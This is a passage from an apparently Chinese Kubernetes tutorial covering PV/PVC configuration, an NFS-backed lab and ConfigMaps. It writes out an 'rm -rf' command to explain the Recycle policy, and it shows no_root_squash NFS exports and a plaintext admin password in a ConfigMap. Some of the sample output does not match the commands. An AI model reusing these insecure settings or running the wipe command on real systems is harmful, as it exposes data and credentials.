存储能力，目前只支持存储空间的设置</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="string">2Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span>  <span class="comment"># 访问模式</span></span><br><span class="line">  <span class="attr">storageClassName:</span> <span class="comment"># 存储类别</span></span><br><span class="line">  <span class="attr">persistentVolumeReclaimPolicy:</span> <span class="comment"># 回收策略</span></span><br></pre></td></tr></table></figure><p>PV 的关键配置参数说明：</p><ul><li><p><strong>存储类型</strong></p><p>底层实际存储的类型，kubernetes支持多种存储类型，每种存储类型的配置都有所差异</p></li><li><p><strong>存储能力（capacity）</strong></p></li></ul><p>目前只支持存储空间的设置( storage&#x3D;1Gi )，不过未来可能会加入IOPS、吞吐量等指标的配置</p><ul><li><p><strong>访问模式（accessModes）</strong></p><p>用于描述用户应用对存储资源的访问权限，访问权限包括下面几种方式：</p><ul><li>ReadWriteOnce（RWO）：读写权限，但是只能被单个节点挂载</li><li>ReadOnlyMany（ROX）： 只读权限，可以被多个节点挂载</li><li>ReadWriteMany（RWX）：读写权限，可以被多个节点挂载</li></ul><p><code>需要注意的是，底层不同的存储类型可能支持的访问模式不同</code></p></li><li><p><strong>回收策略（persistentVolumeReclaimPolicy）</strong></p><p>当PV不再被使用了之后，对其的处理方式。目前支持三种策略：</p><ul><li>Retain （保留） 保留数据，需要管理员手工清理数据</li><li>Recycle（回收） 清除 PV 中的数据，效果相当于执行 rm -rf &#x2F;thevolume&#x2F;*</li><li>Delete （删除） 与 PV 相连的后端存储完成 volume 的删除操作，当然这常见于云服务商的存储服务</li></ul><p><code>需要注意的是，底层不同的存储类型可能支持的回收策略不同</code></p></li><li><p><strong>存储类别</strong></p><p>PV可以通过storageClassName参数指定一个存储类别</p><ul><li>具有特定类别的PV只能与请求了该类别的PVC进行绑定</li><li>未设定类别的PV则只能与不请求任何类别的PVC进行绑定</li></ul></li><li><p><strong>状态（status）</strong></p><p>一个 PV 的生命周期中，可能会处于4中不同的阶段：</p><ul><li>Available（可用）： 表示可用状态，还未被任何 PVC 绑定</li><li>Bound（已绑定）： 表示 PV 已经被 PVC 绑定</li><li>Released（已释放）： 表示 PVC 被删除，但是资源还未被集群重新声明</li><li>Failed（失败）： 表示该 PV 的自动回收失败</li></ul></li></ul><p><strong>实验</strong></p><p>使用NFS作为存储，来演示PV的使用，创建3个PV，对应NFS中的3个暴露的路径。</p><ol><li>准备NFS环境</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建目录</span></span><br><span class="line">[root@nfs ~]# mkdir /root/data/&#123;pv1,pv2,pv3&#125; -pv</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">暴露服务</span></span><br><span class="line">[root@nfs ~]# more /etc/exports</span><br><span class="line">/root/data/pv1     192.168.5.0/24(rw,no_root_squash)</span><br><span class="line">/root/data/pv2     192.168.5.0/24(rw,no_root_squash)</span><br><span class="line">/root/data/pv3     192.168.5.0/24(rw,no_root_squash)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启服务</span></span><br><span class="line">[root@nfs ~]#  systemctl restart nfs</span><br></pre></td></tr></table></figure><ol start="2"><li>创建pv.yaml</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span>  <span class="string">pv1</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">capacity:</span> </span><br><span class="line">    <span class="attr">storage:</span> <span class="string">1Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">ReadWriteMany</span></span><br><span class="line">  <span class="attr">persistentVolumeReclaimPolicy:</span> <span class="string">Retain</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/root/data/pv1</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.5</span><span class="number">.6</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span>  <span class="string">pv2</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">capacity:</span> </span><br><span class="line">    <span class="attr">storage:</span> <span class="string">2Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">ReadWriteMany</span></span><br><span class="line">  <span class="attr">persistentVolumeReclaimPolicy:</span> <span class="string">Retain</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/root/data/pv2</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.5</span><span class="number">.6</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span>  <span class="string">pv3</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">capacity:</span> </span><br><span class="line">    <span class="attr">storage:</span> <span class="string">3Gi</span></span><br><span class="line">  <span class="attr">accessModes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">ReadWriteMany</span></span><br><span class="line">  <span class="attr">persistentVolumeReclaimPolicy:</span> <span class="string">Retain</span></span><br><span class="line">  <span class="attr">nfs:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/root/data/pv3</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.5</span><span class="number">.6</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建 pv</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pv.yaml</span><br><span class="line">persistentvolume/pv1 created</span><br><span class="line">persistentvolume/pv2 created</span><br><span class="line">persistentvolume/pv3 created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pv</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pv -o wide</span><br><span class="line">NAME   CAPACITY   ACCESS MODES  RECLAIM POLICY  STATUS      AGE   VOLUMEMODE</span><br><span class="line">pv1    1Gi        RWX            Retain        Available    10s   Filesystem</span><br><span class="line">pv2    2Gi        RWX            Retain        Available    10s   Filesystem</span><br><span class="line">pv3    3Gi        RWX            Retain        Available    9s    Filesystem</span><br></pre></td></tr></table></figure><h3 id="8-2-2-PVC"><a href="#8-2-2-PVC" class="headerlink" title="8.2.2 PVC"></a>8.2.2 PVC</h3><p>PVC是资源的申请，用来声明对存储空间、访问模式、存储类别需求信息。下面是资源清单文件:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolumeClaim</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pvc</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">accessModes:</span> <span class="comment"># 访问模式</span></span><br><span class="line">  <span class="attr">selector:</span> <span class="comment"># 采用标签对PV选择</span></span><br><span class="line">  <span class="attr">storageClassName:</span> <span class="comment"># 存储类别</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="comment"># 请求空间</span></span><br><span class="line">    <span class="attr">requests:</span></span><br><span class="line">      <span class="attr">storage:</span> <span class="string">5Gi</span></span><br></pre></td></tr></table></figure><p>PVC 的关键配置参数说明：</p><ul><li><strong>访问模式（accessModes）</strong></li></ul><p>用于描述用户应用对存储资源的访问权限</p><ul><li><p><strong>选择条件（selector）</strong></p><p>通过Label Selector的设置，可使PVC对于系统中己存在的PV进行筛选</p></li><li><p><strong>存储类别（storageClassName）</strong></p><p>PVC在定义时可以设定需要的后端存储的类别，只有设置了该class的pv才能被系统选出</p></li><li><p><strong>资源请求（Resources ）</strong></p><p>描述对存储资源的请求</p></li></ul><p><strong>实验</strong></p><ol><li>创建pvc.yaml，申请pv</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolumeClaim</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pvc1</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">accessModes:</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="string">ReadWriteMany</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">    <span class="attr">requests:</span></span><br><span class="line">      <span class="attr">storage:</span> <span class="string">1Gi</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolumeClaim</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pvc2</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">accessModes:</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="string">ReadWriteMany</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">    <span class="attr">requests:</span></span><br><span class="line">      <span class="attr">storage:</span> <span class="string">1Gi</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolumeClaim</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pvc3</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">accessModes:</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="string">ReadWriteMany</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">    <span class="attr">requests:</span></span><br><span class="line">      <span class="attr">storage:</span> <span class="string">1Gi</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建pvc</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pvc.yaml</span><br><span class="line">persistentvolumeclaim/pvc1 created</span><br><span class="line">persistentvolumeclaim/pvc2 created</span><br><span class="line">persistentvolumeclaim/pvc3 created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pvc</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pvc  -n dev -o wide</span><br><span class="line">NAME   STATUS   VOLUME   CAPACITY   ACCESS MODES   STORAGECLASS   AGE   VOLUMEMODE</span><br><span class="line">pvc1   Bound    pv1      1Gi        RWX                           15s   Filesystem</span><br><span class="line">pvc2   Bound    pv2      2Gi        RWX                           15s   Filesystem</span><br><span class="line">pvc3   Bound    pv3      3Gi        RWX                           15s   Filesystem</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pv</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pv -o wide</span><br><span class="line">NAME  CAPACITY ACCESS MODES  RECLAIM POLICY  STATUS    CLAIM       AGE     VOLUMEMODE</span><br><span class="line">pv1    1Gi        RWx        Retain          Bound    dev/pvc1    3h37m    Filesystem</span><br><span class="line">pv2    2Gi        RWX        Retain          Bound    dev/pvc2    3h37m    Filesystem</span><br><span class="line">pv3    3Gi        RWX        Retain          Bound    dev/pvc3    3h37m    Filesystem   </span><br></pre></td></tr></table></figure><ol start="2"><li>创建pods.yaml, 使用pv</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod1</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;while true;do echo pod1 &gt;&gt; /root/out.txt; sleep 10; done;&quot;</span>]</span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">volume</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/root/</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">volume</span></span><br><span class="line">      <span class="attr">persistentVolumeClaim:</span></span><br><span class="line">        <span class="attr">claimName:</span> <span class="string">pvc1</span></span><br><span class="line">        <span class="attr">readOnly:</span> <span class="literal">false</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod2</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;while true;do echo pod2 &gt;&gt; /root/out.txt; sleep 10; done;&quot;</span>]</span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">volume</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/root/</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">volume</span></span><br><span class="line">      <span class="attr">persistentVolumeClaim:</span></span><br><span class="line">        <span class="attr">claimName:</span> <span class="string">pvc2</span></span><br><span class="line">        <span class="attr">readOnly:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pods.yaml</span><br><span class="line">pod/pod1 created</span><br><span class="line">pod/pod2 created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods -n dev -o wide</span><br><span class="line">NAME   READY   STATUS    RESTARTS   AGE   IP            NODE   </span><br><span class="line">pod1   1/1     Running   0          14s   10.244.1.69   node1   </span><br><span class="line">pod2   1/1     Running   0          14s   10.244.1.70   node1  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pvc</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pvc -n dev -o wide</span><br><span class="line">NAME   STATUS   VOLUME   CAPACITY   ACCESS MODES      AGE   VOLUMEMODE</span><br><span class="line">pvc1   Bound    pv1      1Gi        RWX               94m   Filesystem</span><br><span class="line">pvc2   Bound    pv2      2Gi        RWX               94m   Filesystem</span><br><span class="line">pvc3   Bound    pv3      3Gi        RWX               94m   Filesystem</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pv</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pv -n dev -o wide</span><br><span class="line">NAME   CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM       AGE     VOLUMEMODE</span><br><span class="line">pv1    1Gi        RWX            Retain           Bound    dev/pvc1    5h11m   Filesystem</span><br><span class="line">pv2    2Gi        RWX            Retain           Bound    dev/pvc2    5h11m   Filesystem</span><br><span class="line">pv3    3Gi        RWX            Retain           Bound    dev/pvc3    5h11m   Filesystem</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看nfs中的文件存储</span></span><br><span class="line">[root@nfs ~]# more /root/data/pv1/out.txt</span><br><span class="line">node1</span><br><span class="line">node1</span><br><span class="line">[root@nfs ~]# more /root/data/pv2/out.txt</span><br><span class="line">node2</span><br><span class="line">node2</span><br></pre></td></tr></table></figure><h3 id="8-2-3-生命周期"><a href="#8-2-3-生命周期" class="headerlink" title="8.2.3 生命周期"></a>8.2.3 生命周期</h3><p>PVC和PV是一一对应的，PV和PVC之间的相互作用遵循以下生命周期：</p><ul><li><p><strong>资源供应</strong>：管理员手动创建底层存储和PV</p></li><li><p><strong>资源绑定</strong>：用户创建PVC，kubernetes负责根据PVC的声明去寻找PV，并绑定</p><p>在用户定义好PVC之后，系统将根据PVC对存储资源的请求在已存在的PV中选择一个满足条件的</p><ul><li>一旦找到，就将该PV与用户定义的PVC进行绑定，用户的应用就可以使用这个PVC了</li><li>如果找不到，PVC则会无限期处于Pending状态，直到等到系统管理员创建了一个符合其要求的PV</li></ul><p>PV一旦绑定到某个PVC上，就会被这个PVC独占，不能再与其他PVC进行绑定了</p></li><li><p><strong>资源使用</strong>：用户可在pod中像volume一样使用pvc</p><p>Pod使用Volume的定义，将PVC挂载到容器内的某个路径进行使用。</p></li><li><p><strong>资源释放</strong>：用户删除pvc来释放pv</p><p>当存储资源使用完毕后，用户可以删除PVC，与该PVC绑定的PV将会被标记为“已释放”，但还不能立刻与其他PVC进行绑定。通过之前PVC写入的数据可能还被留在存储设备上，只有在清除之后该PV才能再次使用。</p></li><li><p><strong>资源回收</strong>：kubernetes根据pv设置的回收策略进行资源的回收</p><p>对于PV，管理员可以设定回收策略，用于设置与之绑定的PVC释放资源之后如何处理遗留数据的问题。只有PV的存储空间完成回收，才能供新的PVC绑定和使用</p></li></ul><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200515002806726.png" alt="img"></p><h2 id="8-3-配置存储"><a href="#8-3-配置存储" class="headerlink" title="8.3 配置存储"></a>8.3 配置存储</h2><h3 id="8-3-1-ConfigMap"><a href="#8-3-1-ConfigMap" class="headerlink" title="8.3.1 ConfigMap"></a>8.3.1 ConfigMap</h3><p>ConfigMap是一种比较特殊的存储卷，它的主要作用是用来存储配置信息的。</p><p>创建configmap.yaml，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">configmap</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">info:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    username:admin</span></span><br><span class="line"><span class="string">    password:123456</span></span><br></pre></td></tr></table></figure><p>接下来，使用此配置文件创建configmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建configmap</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f configmap.yaml</span><br><span class="line">configmap/configmap created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看configmap详情</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe cm configmap -n dev</span><br><span class="line">Name:         configmap</span><br><span class="line">Namespace:    dev</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line"></span><br><span class="line">Data</span><br><span class="line">====</span><br><span class="line">info:</span><br><span class="line">----</span><br><span class="line">username:admin</span><br><span class="line">password:123456</span><br><span class="line"></span><br><span class="line">Events:  &lt;none&gt;</span><br></pre></td></tr></table></figure><p>接下来创建一个pod-configmap.yaml，将上面创建的configmap挂载进去</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-configmap</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">volumeMounts:</span> <span class="comment"># 将configmap挂载到目录</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">config</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/configmap/config</span></span><br><span class="line">  <span class="attr">volumes:</span> <span class="comment"># 引用configmap</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">config</span></span><br><span class="line">    <span class="attr">configMap:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">configmap</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-configmap.yaml</span><br><span class="line">pod/pod-configmap created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pod pod-configmap -n dev</span><br><span class="line">NAME            READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod-configmap   1/1     Running   0          6s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入容器</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl exec -it pod-configmap -n dev /bin/sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> /configmap/config/</span></span><br><span class="line"><span class="meta prompt_"># </span><span 